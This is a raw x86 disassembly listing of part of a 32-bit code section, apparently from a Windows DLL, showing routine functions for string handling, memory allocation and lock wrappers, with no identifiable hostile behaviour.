10003845:	50                   	push   %eax
10003846:	8b 87 b8 02 00 00    	mov    0x2b8(%edi),%eax
1000384c:	e8 9f 15 00 00       	call   0x10004df0
10003851:	85 c0                	test   %eax,%eax
10003853:	74 52                	je     0x100038a7
10003855:	8b 8f bc 02 00 00    	mov    0x2bc(%edi),%ecx
1000385b:	8b 87 b8 02 00 00    	mov    0x2b8(%edi),%eax
10003861:	e8 b6 0b 00 00       	call   0x1000441c
10003866:	8b 87 b8 02 00 00    	mov    0x2b8(%edi),%eax
1000386c:	8b cf                	mov    %edi,%ecx
1000386e:	e8 a8 0a 00 00       	call   0x1000431b
10003873:	8b 87 b8 02 00 00    	mov    0x2b8(%edi),%eax
10003879:	e8 ae 0a 00 00       	call   0x1000432c
1000387e:	8b 87 b8 02 00 00    	mov    0x2b8(%edi),%eax
10003884:	e8 b4 0a 00 00       	call   0x1000433d
10003889:	8b 87 b8 02 00 00    	mov    0x2b8(%edi),%eax
1000388f:	e8 bf 0c 00 00       	call   0x10004553
10003894:	8b b7 b8 02 00 00    	mov    0x2b8(%edi),%esi
1000389a:	e8 9a 0d 00 00       	call   0x10004639
1000389f:	89 44 24 0c          	mov    %eax,0xc(%esp)
100038a3:	85 c0                	test   %eax,%eax
100038a5:	75 1f                	jne    0x100038c6
100038a7:	8b b7 b8 02 00 00    	mov    0x2b8(%edi),%esi
100038ad:	85 f6                	test   %esi,%esi
100038af:	74 0e                	je     0x100038bf
100038b1:	8b c6                	mov    %esi,%eax
100038b3:	e8 99 17 00 00       	call   0x10005051
100038b8:	56                   	push   %esi
100038b9:	e8 8f 43 00 00       	call   0x10007c4d
100038be:	59                   	pop    %ecx
100038bf:	83 a7 b8 02 00 00 00 	andl   $0x0,0x2b8(%edi)
100038c6:	8b c7                	mov    %edi,%eax
100038c8:	e8 d3 00 00 00       	call   0x100039a0
100038cd:	8b 44 24 0c          	mov    0xc(%esp),%eax
100038d1:	5f                   	pop    %edi
100038d2:	5e                   	pop    %esi
100038d3:	5b                   	pop    %ebx
100038d4:	8b e5                	mov    %ebp,%esp
100038d6:	5d                   	pop    %ebp
100038d7:	c3                   	ret    
100038d8:	55                   	push   %ebp
100038d9:	8b ec                	mov    %esp,%ebp
100038db:	53                   	push   %ebx
100038dc:	56                   	push   %esi
100038dd:	8b 35 34 e1 00 10    	mov    0x1000e134,%esi
100038e3:	57                   	push   %edi
100038e4:	ff 75 0c             	pushl  0xc(%ebp)
100038e7:	33 ff                	xor    %edi,%edi
100038e9:	ff d6                	call   *%esi
100038eb:	ff 75 10             	pushl  0x10(%ebp)
100038ee:	8b d8                	mov    %eax,%ebx
100038f0:	ff d6                	call   *%esi
100038f2:	8d 44 03 44          	lea    0x44(%ebx,%eax,1),%eax
100038f6:	50                   	push   %eax
100038f7:	e8 e8 30 00 00       	call   0x100069e4
100038fc:	8b f0                	mov    %eax,%esi
100038fe:	59                   	pop    %ecx
100038ff:	85 f6                	test   %esi,%esi
10003901:	74 29                	je     0x1000392c
10003903:	ff 75 10             	pushl  0x10(%ebp)
10003906:	ff 75 0c             	pushl  0xc(%ebp)
10003909:	68 38 e5 00 10       	push   $0x1000e538
1000390e:	56                   	push   %esi
1000390f:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10003915:	8b 45 08             	mov    0x8(%ebp),%eax
10003918:	83 c4 10             	add    $0x10,%esp
1000391b:	56                   	push   %esi
1000391c:	6a 0e                	push   $0xe
1000391e:	e8 be 01 00 00       	call   0x10003ae1
10003923:	56                   	push   %esi
10003924:	8b f8                	mov    %eax,%edi
10003926:	e8 e8 30 00 00       	call   0x10006a13
1000392b:	59                   	pop    %ecx
1000392c:	8b c7                	mov    %edi,%eax
1000392e:	5f                   	pop    %edi
1000392f:	5e                   	pop    %esi
10003930:	5b                   	pop    %ebx
10003931:	5d                   	pop    %ebp
10003932:	c2 0c 00             	ret    $0xc
10003935:	83 66 24 00          	andl   $0x0,0x24(%esi)
10003939:	8b ce                	mov    %esi,%ecx
1000393b:	e8 e8 fd ff ff       	call   0x10003728
10003940:	85 c0                	test   %eax,%eax
10003942:	74 07                	je     0x1000394b
10003944:	c7 46 04 01 00 00 00 	movl   $0x1,0x4(%esi)
1000394b:	c3                   	ret    
1000394c:	56                   	push   %esi
1000394d:	57                   	push   %edi
1000394e:	8b f8                	mov    %eax,%edi
10003950:	8b b7 b8 02 00 00    	mov    0x2b8(%edi),%esi
10003956:	e8 18 0d 00 00       	call   0x10004673
1000395b:	8b bf b8 02 00 00    	mov    0x2b8(%edi),%edi
10003961:	85 ff                	test   %edi,%edi
10003963:	74 0e                	je     0x10003973
10003965:	8b c7                	mov    %edi,%eax
10003967:	e8 e5 16 00 00       	call   0x10005051
1000396c:	57                   	push   %edi
1000396d:	e8 db 42 00 00       	call   0x10007c4d
10003972:	59                   	pop    %ecx
10003973:	5f                   	pop    %edi
10003974:	5e                   	pop    %esi
10003975:	c3                   	ret    
10003976:	05 90 03 00 00       	add    $0x390,%eax
1000397b:	50                   	push   %eax
1000397c:	ff 15 64 e1 00 10    	call   *0x1000e164
10003982:	33 c0                	xor    %eax,%eax
10003984:	40                   	inc    %eax
10003985:	c3                   	ret    
10003986:	05 90 03 00 00       	add    $0x390,%eax
1000398b:	50                   	push   %eax
1000398c:	ff 15 60 e1 00 10    	call   *0x1000e160
10003992:	c3                   	ret    
10003993:	05 a8 03 00 00       	add    $0x3a8,%eax
10003998:	50                   	push   %eax
10003999:	ff 15 00 e1 00 10    	call   *0x1000e100
1000399f:	c3                   	ret    
100039a0:	05 a8 03 00 00       	add    $0x3a8,%eax
100039a5:	50                   	push   %eax
100039a6:	ff 15 60 e1 00 10    	call   *0x1000e160
100039ac:	c3                   	ret    
100039ad:	05 c4 03 00 00       	add    $0x3c4,%eax
100039b2:	50                   	push   %eax
100039b3:	ff 15 64 e1 00 10    	call   *0x1000e164
100039b9:	33 c0                	xor    %eax,%eax
100039bb:	40                   	inc    %eax
100039bc:	c3                   	ret    
100039bd:	05 c4 03 00 00       	add    $0x3c4,%eax
100039c2:	50                   	push   %eax
100039c3:	ff 15 60 e1 00 10    	call   *0x1000e160
100039c9:	c3                   	ret    
100039ca:	55                   	push   %ebp
100039cb:	8b ec                	mov    %esp,%ebp
100039cd:	53                   	push   %ebx
100039ce:	8b c7                	mov    %edi,%eax
100039d0:	33 db                	xor    %ebx,%ebx
100039d2:	e8 bc ff ff ff       	call   0x10003993
100039d7:	85 c0                	test   %eax,%eax
100039d9:	74 41                	je     0x10003a1c
100039db:	56                   	push   %esi
100039dc:	8b b7 b8 02 00 00    	mov    0x2b8(%edi),%esi
100039e2:	85 f6                	test   %esi,%esi
100039e4:	74 2e                	je     0x10003a14
100039e6:	8b c6                	mov    %esi,%eax
100039e8:	e8 3a 11 00 00       	call   0x10004b27
100039ed:	83 f8 04             	cmp    $0x4,%eax
100039f0:	74 16                	je     0x10003a08
100039f2:	39 5d 08             	cmp    %ebx,0x8(%ebp)
100039f5:	74 1d                	je     0x10003a14
100039f7:	e8 20 0c 00 00       	call   0x1000461c
100039fc:	85 c0                	test   %eax,%eax
100039fe:	74 14                	je     0x10003a14
10003a00:	8b 9f b8 02 00 00    	mov    0x2b8(%edi),%ebx
10003a06:	eb 02                	jmp    0x10003a0a
10003a08:	8b de                	mov    %esi,%ebx
10003a0a:	85 db                	test   %ebx,%ebx
10003a0c:	74 06                	je     0x10003a14
10003a0e:	53                   	push   %ebx
10003a0f:	e8 b1 06 00 00       	call   0x100040c5
10003a14:	8b c7                	mov    %edi,%eax
10003a16:	e8 85 ff ff ff       	call   0x100039a0
10003a1b:	5e                   	pop    %esi
10003a1c:	8b c3                	mov    %ebx,%eax
10003a1e:	5b                   	pop    %ebx
10003a1f:	5d                   	pop    %ebp
10003a20:	c2 04 00             	ret    $0x4
10003a23:	55                   	push   %ebp
10003a24:	8b ec                	mov    %esp,%ebp
10003a26:	83 ec 30             	sub    $0x30,%esp
10003a29:	53                   	push   %ebx
10003a2a:	56                   	push   %esi
10003a2b:	ff 75 0c             	pushl  0xc(%ebp)
10003a2e:	33 db                	xor    %ebx,%ebx
10003a30:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10003a33:	89 5d f0             	mov    %ebx,-0x10(%ebp)
10003a36:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10003a39:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10003a3c:	ff 15 34 e1 00 10    	call   *0x1000e134
10003a42:	8d 70 01             	lea    0x1(%eax),%esi
10003a45:	56                   	push   %esi
10003a46:	e8 99 2f 00 00       	call   0x100069e4
10003a4b:	59                   	pop    %ecx
10003a4c:	89 45 e0             	mov    %eax,-0x20(%ebp)
10003a4f:	3b c3                	cmp    %ebx,%eax
10003a51:	74 59                	je     0x10003aac
10003a53:	33 c0                	xor    %eax,%eax
10003a55:	40                   	inc    %eax
10003a56:	56                   	push   %esi
10003a57:	ff 75 0c             	pushl  0xc(%ebp)
10003a5a:	89 45 f4             	mov    %eax,-0xc(%ebp)
10003a5d:	ff 75 e0             	pushl  -0x20(%ebp)
10003a60:	89 45 d8             	mov    %eax,-0x28(%ebp)
10003a63:	8b 45 08             	mov    0x8(%ebp),%eax
10003a66:	89 45 dc             	mov    %eax,-0x24(%ebp)
10003a69:	e8 a2 a2 00 00       	call   0x1000dd10
10003a6e:	83 c4 0c             	add    $0xc,%esp
10003a71:	8b c7                	mov    %edi,%eax
10003a73:	e8 35 ff ff ff       	call   0x100039ad
10003a78:	85 c0                	test   %eax,%eax
10003a7a:	74 27                	je     0x10003aa3
10003a7c:	8d 45 d0             	lea    -0x30(%ebp),%eax
10003a7f:	50                   	push   %eax
10003a80:	8d b7 80 03 00 00    	lea    0x380(%edi),%esi
10003a86:	e8 c4 66 00 00       	call   0x1000a14f
10003a8b:	59                   	pop    %ecx
10003a8c:	33 c9                	xor    %ecx,%ecx
10003a8e:	83 f8 ff             	cmp    $0xffffffff,%eax
10003a91:	0f 95 c1             	setne  %cl
10003a94:	8b c7                	mov    %edi,%eax
10003a96:	89 4d fc             	mov    %ecx,-0x4(%ebp)
10003a99:	e8 1f ff ff ff       	call   0x100039bd
10003a9e:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
10003aa1:	75 09                	jne    0x10003aac
10003aa3:	ff 75 e0             	pushl  -0x20(%ebp)
10003aa6:	e8 68 2f 00 00       	call   0x10006a13
10003aab:	59                   	pop    %ecx
10003aac:	8b 45 fc             	mov    -0x4(%ebp),%eax
10003aaf:	5e                   	pop    %esi
10003ab0:	5b                   	pop    %ebx
10003ab1:	c9                   	leave  
10003ab2:	c2 08 00             	ret    $0x8
10003ab5:	55                   	push   %ebp
10003ab6:	8b ec                	mov    %esp,%ebp
10003ab8:	51                   	push   %ecx
10003ab9:	ff 75 08             	pushl  0x8(%ebp)
10003abc:	e8 d2 f6 ff ff       	call   0x10003193
10003ac1:	59                   	pop    %ecx
10003ac2:	5d                   	pop    %ebp
10003ac3:	c2 04 00             	ret    $0x4
10003ac6:	55                   	push   %ebp
10003ac7:	8b ec                	mov    %esp,%ebp
10003ac9:	51                   	push   %ecx
10003aca:	68 c8 f4 00 10       	push   $0x1000f4c8
10003acf:	68 40 e5 00 10       	push   $0x1000e540
10003ad4:	ff 75 08             	pushl  0x8(%ebp)
10003ad7:	e8 fc fd ff ff       	call   0x100038d8
10003adc:	59                   	pop    %ecx
10003add:	5d                   	pop    %ebp
10003ade:	c2 04 00             	ret    $0x4
10003ae1:	55                   	push   %ebp
10003ae2:	8b ec                	mov    %esp,%ebp
10003ae4:	51                   	push   %ecx
10003ae5:	57                   	push   %edi
10003ae6:	ff 75 0c             	pushl  0xc(%ebp)
10003ae9:	8b f8                	mov    %eax,%edi
10003aeb:	ff 75 08             	pushl  0x8(%ebp)
10003aee:	e8 30 ff ff ff       	call   0x10003a23
10003af3:	85 c0                	test   %eax,%eax
10003af5:	74 09                	je     0x10003b00
10003af7:	57                   	push   %edi
10003af8:	e8 b8 ff ff ff       	call   0x10003ab5
10003afd:	33 c0                	xor    %eax,%eax
10003aff:	40                   	inc    %eax
10003b00:	5f                   	pop    %edi
10003b01:	59                   	pop    %ecx
10003b02:	5d                   	pop    %ebp
10003b03:	c2 08 00             	ret    $0x8
10003b06:	55                   	push   %ebp
10003b07:	8b ec                	mov    %esp,%ebp
10003b09:	56                   	push   %esi
10003b0a:	57                   	push   %edi
10003b0b:	ff 75 14             	pushl  0x14(%ebp)
10003b0e:	33 ff                	xor    %edi,%edi
10003b10:	ff 15 34 e1 00 10    	call   *0x1000e134
10003b16:	83 c0 40             	add    $0x40,%eax
10003b19:	50                   	push   %eax
10003b1a:	e8 c5 2e 00 00       	call   0x100069e4
10003b1f:	8b f0                	mov    %eax,%esi
10003b21:	59                   	pop    %ecx
10003b22:	85 f6                	test   %esi,%esi
10003b24:	74 2c                	je     0x10003b52
10003b26:	ff 75 14             	pushl  0x14(%ebp)
10003b29:	ff 75 0c             	pushl  0xc(%ebp)
10003b2c:	ff 75 10             	pushl  0x10(%ebp)
10003b2f:	68 48 e5 00 10       	push   $0x1000e548
10003b34:	56                   	push   %esi
10003b35:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10003b3b:	8b 45 08             	mov    0x8(%ebp),%eax
10003b3e:	83 c4 14             	add    $0x14,%esp
10003b41:	56                   	push   %esi
10003b42:	6a 0a                	push   $0xa
10003b44:	e8 98 ff ff ff       	call   0x10003ae1
10003b49:	56                   	push   %esi
10003b4a:	8b f8                	mov    %eax,%edi
10003b4c:	e8 c2 2e 00 00       	call   0x10006a13
10003b51:	59                   	pop    %ecx
10003b52:	8b c7                	mov    %edi,%eax
10003b54:	5f                   	pop    %edi
10003b55:	5e                   	pop    %esi
10003b56:	5d                   	pop    %ebp
10003b57:	c2 10 00             	ret    $0x10
10003b5a:	55                   	push   %ebp
10003b5b:	8b ec                	mov    %esp,%ebp
10003b5d:	83 ec 30             	sub    $0x30,%esp
10003b60:	53                   	push   %ebx
10003b61:	56                   	push   %esi
10003b62:	33 db                	xor    %ebx,%ebx
10003b64:	8b f0                	mov    %eax,%esi
10003b66:	56                   	push   %esi
10003b67:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10003b6a:	89 5d f0             	mov    %ebx,-0x10(%ebp)
10003b6d:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10003b70:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10003b73:	e8 6c 2e 00 00       	call   0x100069e4
10003b78:	59                   	pop    %ecx
10003b79:	89 45 e4             	mov    %eax,-0x1c(%ebp)
10003b7c:	3b c3                	cmp    %ebx,%eax
10003b7e:	0f 84 aa 00 00 00    	je     0x10003c2e
10003b84:	57                   	push   %edi
10003b85:	56                   	push   %esi
10003b86:	ff 75 10             	pushl  0x10(%ebp)
10003b89:	33 ff                	xor    %edi,%edi
10003b8b:	47                   	inc    %edi
10003b8c:	50                   	push   %eax
10003b8d:	89 7d f8             	mov    %edi,-0x8(%ebp)
10003b90:	c7 45 d8 02 00 00 00 	movl   $0x2,-0x28(%ebp)
10003b97:	c7 45 dc 3f 00 00 00 	movl   $0x3f,-0x24(%ebp)
10003b9e:	e8 6d a1 00 00       	call   0x1000dd10
10003ba3:	8b 45 14             	mov    0x14(%ebp),%eax
10003ba6:	83 c4 0c             	add    $0xc,%esp
10003ba9:	89 75 e8             	mov    %esi,-0x18(%ebp)
10003bac:	89 45 ec             	mov    %eax,-0x14(%ebp)
10003baf:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
10003bb2:	74 28                	je     0x10003bdc
10003bb4:	ff 75 0c             	pushl  0xc(%ebp)
10003bb7:	ff 15 34 e1 00 10    	call   *0x1000e134
10003bbd:	8d 70 01             	lea    0x1(%eax),%esi
10003bc0:	56                   	push   %esi
10003bc1:	e8 1e 2e 00 00       	call   0x100069e4
10003bc6:	59                   	pop    %ecx
10003bc7:	89 45 e0             	mov    %eax,-0x20(%ebp)
10003bca:	3b c3                	cmp    %ebx,%eax
10003bcc:	74 0e                	je     0x10003bdc
10003bce:	ff 75 0c             	pushl  0xc(%ebp)
10003bd1:	8b c8                	mov    %eax,%ecx
10003bd3:	56                   	push   %esi
10003bd4:	e8 13 f2 ff ff       	call   0x10002dec
10003bd9:	89 7d f4             	mov    %edi,-0xc(%ebp)
10003bdc:	8b 7d 08             	mov    0x8(%ebp),%edi
10003bdf:	8b c7                	mov    %edi,%eax
10003be1:	e8 c7 fd ff ff       	call   0x100039ad
10003be6:	85 c0                	test   %eax,%eax
10003be8:	74 27                	je     0x10003c11
10003bea:	8d 45 d0             	lea    -0x30(%ebp),%eax
10003bed:	50                   	push   %eax
10003bee:	8d b7 80 03 00 00    	lea    0x380(%edi),%esi
10003bf4:	e8 56 65 00 00       	call   0x1000a14f
10003bf9:	59                   	pop    %ecx
10003bfa:	33 c9                	xor    %ecx,%ecx
10003bfc:	83 f8 ff             	cmp    $0xffffffff,%eax
10003bff:	0f 95 c1             	setne  %cl
10003c02:	8b c7                	mov    %edi,%eax
10003c04:	89 4d fc             	mov    %ecx,-0x4(%ebp)
10003c07:	e8 b1 fd ff ff       	call   0x100039bd
10003c0c:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
10003c0f:	75 1c                	jne    0x10003c2d
10003c11:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
10003c14:	74 09                	je     0x10003c1f
10003c16:	ff 75 e4             	pushl  -0x1c(%ebp)
10003c19:	e8 f5 2d 00 00       	call   0x10006a13
10003c1e:	59                   	pop    %ecx
10003c1f:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
10003c22:	74 09                	je     0x10003c2d
10003c24:	ff 75 e0             	pushl  -0x20(%ebp)
10003c27:	e8 e7 2d 00 00       	call   0x10006a13
10003c2c:	59                   	pop    %ecx
10003c2d:	5f                   	pop    %edi
10003c2e:	8b 45 fc             	mov    -0x4(%ebp),%eax
10003c31:	5e                   	pop    %esi
10003c32:	5b                   	pop    %ebx
10003c33:	c9                   	leave  
10003c34:	c2 10 00             	ret    $0x10
10003c37:	55                   	push   %ebp
10003c38:	8b ec                	mov    %esp,%ebp
10003c3a:	ff 75 14             	pushl  0x14(%ebp)
10003c3d:	ff 75 10             	pushl  0x10(%ebp)
10003c40:	ff 75 0c             	pushl  0xc(%ebp)
10003c43:	ff 75 08             	pushl  0x8(%ebp)
10003c46:	e8 0f ff ff ff       	call   0x10003b5a
10003c4b:	85 c0                	test   %eax,%eax
10003c4d:	74 0b                	je     0x10003c5a
10003c4f:	ff 75 08             	pushl  0x8(%ebp)
10003c52:	e8 5e fe ff ff       	call   0x10003ab5
10003c57:	33 c0                	xor    %eax,%eax
10003c59:	40                   	inc    %eax
10003c5a:	5d                   	pop    %ebp
10003c5b:	c2 10 00             	ret    $0x10
10003c5e:	55                   	push   %ebp
10003c5f:	8b ec                	mov    %esp,%ebp
10003c61:	81 ec 04 01 00 00    	sub    $0x104,%esp
10003c67:	56                   	push   %esi
10003c68:	8b 75 08             	mov    0x8(%ebp),%esi
10003c6b:	57                   	push   %edi
10003c6c:	8b c6                	mov    %esi,%eax
10003c6e:	33 ff                	xor    %edi,%edi
10003c70:	e8 01 fd ff ff       	call   0x10003976
10003c75:	85 c0                	test   %eax,%eax
10003c77:	0f 84 c4 00 00 00    	je     0x10003d41
10003c7d:	8d 7e 08             	lea    0x8(%esi),%edi
10003c80:	53                   	push   %ebx
10003c81:	8b c7                	mov    %edi,%eax
10003c83:	33 db                	xor    %ebx,%ebx
10003c85:	e8 14 67 00 00       	call   0x1000a39e
10003c8a:	85 c0                	test   %eax,%eax
10003c8c:	74 1c                	je     0x10003caa
10003c8e:	53                   	push   %ebx
10003c8f:	8b cf                	mov    %edi,%ecx
10003c91:	e8 d5 66 00 00       	call   0x1000a36b
10003c96:	ff 30                	pushl  (%eax)
10003c98:	e8 76 2d 00 00       	call   0x10006a13
10003c9d:	59                   	pop    %ecx
10003c9e:	8b c7                	mov    %edi,%eax
10003ca0:	43                   	inc    %ebx
10003ca1:	e8 f8 66 00 00       	call   0x1000a39e
10003ca6:	3b d8                	cmp    %eax,%ebx
10003ca8:	72 e4                	jb     0x10003c8e
10003caa:	8b c7                	mov    %edi,%eax
10003cac:	e8 e5 66 00 00       	call   0x1000a396
10003cb1:	8b 45 0c             	mov    0xc(%ebp),%eax
10003cb4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10003cb8:	68 00 01 00 00       	push   $0x100
10003cbd:	6a 00                	push   $0x0
10003cbf:	8d 9d fc fe ff ff    	lea    -0x104(%ebp),%ebx
10003cc5:	e8 70 18 00 00       	call   0x1000553a
10003cca:	59                   	pop    %ecx
10003ccb:	59                   	pop    %ecx
10003ccc:	85 c0                	test   %eax,%eax
10003cce:	74 5d                	je     0x10003d2d
10003cd0:	8b 35 34 e1 00 10    	mov    0x1000e134,%esi
10003cd6:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
10003cdc:	50                   	push   %eax
10003cdd:	ff d6                	call   *%esi
10003cdf:	40                   	inc    %eax
10003ce0:	50                   	push   %eax
10003ce1:	e8 fe 2c 00 00       	call   0x100069e4
10003ce6:	8b d8                	mov    %eax,%ebx
10003ce8:	59                   	pop    %ecx
10003ce9:	85 db                	test   %ebx,%ebx
10003ceb:	74 1e                	je     0x10003d0b
10003ced:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
10003cf3:	50                   	push   %eax
10003cf4:	50                   	push   %eax
10003cf5:	c6 03 00             	movb   $0x0,(%ebx)
10003cf8:	ff d6                	call   *%esi
10003cfa:	40                   	inc    %eax
10003cfb:	50                   	push   %eax
10003cfc:	8b cb                	mov    %ebx,%ecx
10003cfe:	e8 e9 f0 ff ff       	call   0x10002dec
10003d03:	53                   	push   %ebx
10003d04:	8b cf                	mov    %edi,%ecx
10003d06:	e8 19 66 00 00       	call   0x1000a324
10003d0b:	ff 45 fc             	incl   -0x4(%ebp)
10003d0e:	8b 45 0c             	mov    0xc(%ebp),%eax
10003d11:	68 00 01 00 00       	push   $0x100
10003d16:	ff 75 fc             	pushl  -0x4(%ebp)
10003d19:	8d 9d fc fe ff ff    	lea    -0x104(%ebp),%ebx
10003d1f:	e8 16 18 00 00       	call   0x1000553a
10003d24:	59                   	pop    %ecx
10003d25:	59                   	pop    %ecx
10003d26:	85 c0                	test   %eax,%eax
10003d28:	75 ac                	jne    0x10003cd6
10003d2a:	8b 75 08             	mov    0x8(%ebp),%esi
10003d2d:	e8 81 66 00 00       	call   0x1000a3b3
10003d32:	83 4e 20 ff          	orl    $0xffffffff,0x20(%esi)
10003d36:	33 ff                	xor    %edi,%edi
10003d38:	8b c6                	mov    %esi,%eax
10003d3a:	47                   	inc    %edi
10003d3b:	e8 46 fc ff ff       	call   0x10003986
10003d40:	5b                   	pop    %ebx
10003d41:	8b c7                	mov    %edi,%eax
10003d43:	5f                   	pop    %edi
10003d44:	5e                   	pop    %esi
10003d45:	c9                   	leave  
10003d46:	c2 08 00             	ret    $0x8
10003d49:	55                   	push   %ebp
10003d4a:	8b ec                	mov    %esp,%ebp
10003d4c:	33 d2                	xor    %edx,%edx
10003d4e:	8d 81 c4 02 00 00    	lea    0x2c4(%ecx),%eax
10003d54:	83 38 00             	cmpl   $0x0,(%eax)
10003d57:	74 0b                	je     0x10003d64
10003d59:	42                   	inc    %edx
10003d5a:	83 c0 0c             	add    $0xc,%eax
10003d5d:	83 fa 10             	cmp    $0x10,%edx
10003d60:	7c f2                	jl     0x10003d54
10003d62:	eb 27                	jmp    0x10003d8b
10003d64:	8b c2                	mov    %edx,%eax
10003d66:	6b c0 0c             	imul   $0xc,%eax,%eax
10003d69:	83 c2 3b             	add    $0x3b,%edx
10003d6c:	56                   	push   %esi
10003d6d:	6b d2 0c             	imul   $0xc,%edx,%edx
10003d70:	8b 75 08             	mov    0x8(%ebp),%esi
10003d73:	89 b4 08 c0 02 00 00 	mov    %esi,0x2c0(%eax,%ecx,1)
10003d7a:	8b 75 10             	mov    0x10(%ebp),%esi
10003d7d:	89 b4 08 c8 02 00 00 	mov    %esi,0x2c8(%eax,%ecx,1)
10003d84:	8b 45 0c             	mov    0xc(%ebp),%eax
10003d87:	89 04 0a             	mov    %eax,(%edx,%ecx,1)
10003d8a:	5e                   	pop    %esi
10003d8b:	33 c0                	xor    %eax,%eax
10003d8d:	40                   	inc    %eax
10003d8e:	5d                   	pop    %ebp
10003d8f:	c2 0c 00             	ret    $0xc
10003d92:	55                   	push   %ebp
10003d93:	8b ec                	mov    %esp,%ebp
10003d95:	53                   	push   %ebx
10003d96:	56                   	push   %esi
10003d97:	8b 35 34 e1 00 10    	mov    0x1000e134,%esi
10003d9d:	57                   	push   %edi
10003d9e:	ff 75 0c             	pushl  0xc(%ebp)
10003da1:	8b d8                	mov    %eax,%ebx
10003da3:	ff d6                	call   *%esi
10003da5:	40                   	inc    %eax
10003da6:	bf 00 01 00 00       	mov    $0x100,%edi
10003dab:	3b c7                	cmp    %edi,%eax
10003dad:	76 04                	jbe    0x10003db3
10003daf:	33 c0                	xor    %eax,%eax
10003db1:	eb 50                	jmp    0x10003e03
10003db3:	50                   	push   %eax
10003db4:	ff 75 0c             	pushl  0xc(%ebp)
10003db7:	8d 83 28 01 00 00    	lea    0x128(%ebx),%eax
10003dbd:	50                   	push   %eax
10003dbe:	e8 4d 9f 00 00       	call   0x1000dd10
10003dc3:	83 c4 0c             	add    $0xc,%esp
10003dc6:	ff 75 08             	pushl  0x8(%ebp)
10003dc9:	ff d6                	call   *%esi
10003dcb:	40                   	inc    %eax
10003dcc:	3b c7                	cmp    %edi,%eax
10003dce:	77 df                	ja     0x10003daf
10003dd0:	50                   	push   %eax
10003dd1:	ff 75 08             	pushl  0x8(%ebp)
10003dd4:	8d 43 28             	lea    0x28(%ebx),%eax
10003dd7:	50                   	push   %eax
10003dd8:	e8 33 9f 00 00       	call   0x1000dd10
10003ddd:	83 c4 0c             	add    $0xc,%esp
10003de0:	ff 75 10             	pushl  0x10(%ebp)
10003de3:	ff d6                	call   *%esi
10003de5:	40                   	inc    %eax
10003de6:	3d 80 00 00 00       	cmp    $0x80,%eax
10003deb:	77 c2                	ja     0x10003daf
10003ded:	50                   	push   %eax
10003dee:	ff 75 10             	pushl  0x10(%ebp)
10003df1:	81 c3 28 02 00 00    	add    $0x228,%ebx
10003df7:	53                   	push   %ebx
10003df8:	e8 13 9f 00 00       	call   0x1000dd10
10003dfd:	33 c0                	xor    %eax,%eax
10003dff:	83 c4 0c             	add    $0xc,%esp
10003e02:	40                   	inc    %eax
10003e03:	5f                   	pop    %edi
10003e04:	5e                   	pop    %esi
10003e05:	5b                   	pop    %ebx
10003e06:	5d                   	pop    %ebp
10003e07:	c2 0c 00             	ret    $0xc
10003e0a:	89 88 bc 02 00 00    	mov    %ecx,0x2bc(%eax)
10003e10:	c3                   	ret    
10003e11:	55                   	push   %ebp
10003e12:	8b ec                	mov    %esp,%ebp
10003e14:	53                   	push   %ebx
10003e15:	56                   	push   %esi
10003e16:	57                   	push   %edi
10003e17:	33 db                	xor    %ebx,%ebx
10003e19:	53                   	push   %ebx
10003e1a:	8b f8                	mov    %eax,%edi
10003e1c:	e8 a9 fb ff ff       	call   0x100039ca
10003e21:	8b f0                	mov    %eax,%esi
10003e23:	3b f3                	cmp    %ebx,%esi
10003e25:	74 17                	je     0x10003e3e
10003e27:	ff 75 10             	pushl  0x10(%ebp)
10003e2a:	8b 7d 08             	mov    0x8(%ebp),%edi
10003e2d:	ff 75 0c             	pushl  0xc(%ebp)
10003e30:	56                   	push   %esi
10003e31:	e8 ed 05 00 00       	call   0x10004423
10003e36:	56                   	push   %esi
10003e37:	8b d8                	mov    %eax,%ebx
10003e39:	e8 91 02 00 00       	call   0x100040cf
10003e3e:	5f                   	pop    %edi
10003e3f:	5e                   	pop    %esi
10003e40:	8b c3                	mov    %ebx,%eax
10003e42:	5b                   	pop    %ebx
10003e43:	5d                   	pop    %ebp
10003e44:	c2 0c 00             	ret    $0xc
10003e47:	55                   	push   %ebp
10003e48:	8b ec                	mov    %esp,%ebp
10003e4a:	53                   	push   %ebx
10003e4b:	56                   	push   %esi
10003e4c:	6a 01                	push   $0x1
10003e4e:	33 db                	xor    %ebx,%ebx
10003e50:	e8 75 fb ff ff       	call   0x100039ca
10003e55:	8b f0                	mov    %eax,%esi
10003e57:	85 f6                	test   %esi,%esi
10003e59:	74 13                	je     0x10003e6e
10003e5b:	ff 75 0c             	pushl  0xc(%ebp)
10003e5e:	ff 75 08             	pushl  0x8(%ebp)
10003e61:	e8 d0 03 00 00       	call   0x10004236
10003e66:	56                   	push   %esi
10003e67:	8b d8                	mov    %eax,%ebx
10003e69:	e8 61 02 00 00       	call   0x100040cf
10003e6e:	5e                   	pop    %esi
10003e6f:	8b c3                	mov    %ebx,%eax
10003e71:	5b                   	pop    %ebx
10003e72:	5d                   	pop    %ebp
10003e73:	c2 08 00             	ret    $0x8
10003e76:	55                   	push   %ebp
10003e77:	8b ec                	mov    %esp,%ebp
10003e79:	53                   	push   %ebx
10003e7a:	56                   	push   %esi
10003e7b:	6a 01                	push   $0x1
10003e7d:	33 db                	xor    %ebx,%ebx
10003e7f:	e8 46 fb ff ff       	call   0x100039ca
10003e84:	8b f0                	mov    %eax,%esi
10003e86:	85 f6                	test   %esi,%esi
10003e88:	74 13                	je     0x10003e9d
10003e8a:	ff 75 0c             	pushl  0xc(%ebp)
10003e8d:	ff 75 08             	pushl  0x8(%ebp)
10003e90:	e8 cc 03 00 00       	call   0x10004261
10003e95:	56                   	push   %esi
10003e96:	8b d8                	mov    %eax,%ebx
10003e98:	e8 32 02 00 00       	call   0x100040cf
10003e9d:	5e                   	pop    %esi
